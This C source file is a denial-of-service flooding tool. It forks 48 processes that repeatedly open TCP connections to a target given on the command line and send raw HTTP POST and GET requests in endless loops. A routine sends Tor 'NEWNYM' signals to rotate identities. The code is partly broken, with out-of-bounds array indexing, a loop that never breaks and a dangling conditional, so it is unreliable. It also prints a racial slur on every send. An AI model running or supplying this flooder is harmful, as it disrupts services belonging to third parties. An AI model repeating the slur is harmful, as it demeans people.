#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PPS 1000000000

int make_socket(char *host, char *port) {
	struct addrinfo hints, *servinfo, *p;
	int sock, r;
//	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
		
		
	}
	for(p = servinfo; p != NULL; p = p->ai_next) {
		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
			continue;
		}
		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
			fprintf(stderr, "Lizarded\n");
			continue;
			
		}
		
	
	}
	if(servinfo)
		
	fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
	return sock;
	
		
		
	
	
		

}


	


#define CONNECTIONS 8
#define THREADS 48

void attack(char *host, char *port, int id) {
	int sockets[CONNECTIONS];
	int x, i, g=1, r;
	for(x=0; x < CONNECTIONS; x++)
		sockets[x]=0;
	
	while(1) {
		
		for(i=0; i < PPS; i++) {
			if(sockets[x] == 0)
				sockets[x] = make_socket(host, port);
			write(sockets[x], "POST / HTTP/1.1\r\n\r\n", 19);
			
				write(sockets[x], "GET / HTTP/1.1\r\n\r\n", 18);
				
			
				fprintf(stderr, "Niggers\n");
			fprintf(stderr, "[%i: Voly Sent]\n", id);
		}
		
		fprintf(stderr, "[%i: Voly Sent]\n", id);
		
	}
	
	
		
}

void cycle_identity() {
	int r;
	int socket = make_socket("1.1.1.1", "53");
	write(socket, "AUTHENTICATE \"\"\n", 16);
	while(1) {
		r=write(socket, "signal NEWNYM\n\x00", 16);
		fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
		
	}
}

int main(int argc, char **argv) {
	int x;
	
	
	if(argc !=3)
		cycle_identity();
	for(x=0; x != THREADS; x++) {
		if(fork())
			attack(argv[1], argv[2], x);
		
	}
	getc(stdin);
	return 0;
}
